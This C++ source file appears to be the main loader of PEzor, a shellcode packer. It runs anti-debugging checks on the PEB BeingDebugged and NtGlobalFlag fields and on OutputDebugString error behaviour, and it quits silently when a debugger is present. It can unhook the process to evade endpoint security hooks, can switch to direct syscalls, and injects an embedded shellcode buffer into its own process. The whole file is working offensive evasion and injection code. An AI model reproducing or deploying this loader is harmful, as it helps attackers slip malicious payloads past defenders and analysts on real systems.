#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#include "PEzor.hpp"

#define NT_FAIL(status) (status < 0)
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

inline void anti_debug(void) {
    DWORD errorValue = 1111;
    SetLastError(errorValue);
    OutputDebugString(" ");
    if (GetLastError() != errorValue) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }

    __PPEB peb = GetProcessEnvironmentBlock();
    if (peb->bBeingDebugged) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }

    if (peb->dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }
}

int main() {
    #ifdef _DEBUG_
        puts("PEzor starting!");
    #endif
    #ifdef ANTIDEBUG
        #ifdef _DEBUG_
            puts("anti-debug checks");
        #endif
        anti_debug();
    #endif
    #ifdef UNHOOK
        #ifdef _DEBUG_
            puts("unhooking process");
        #endif
        RefreshPE();
    #endif
    #ifdef SYSCALLS
        my_init_syscalls_list();
    #endif
    HANDLE hThread = (HANDLE)-1;
    NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
    if (NT_FAIL(status) || hThread == (HANDLE)-1) {
        #ifdef _DEBUG_
            printf("inject_shellcode_self: ERROR 0x%x", status);
        #endif
        return status;
    }

    #ifdef _DEBUG_
        puts("inject_shellcode_self: OK");
    #endif
    return 0;
}
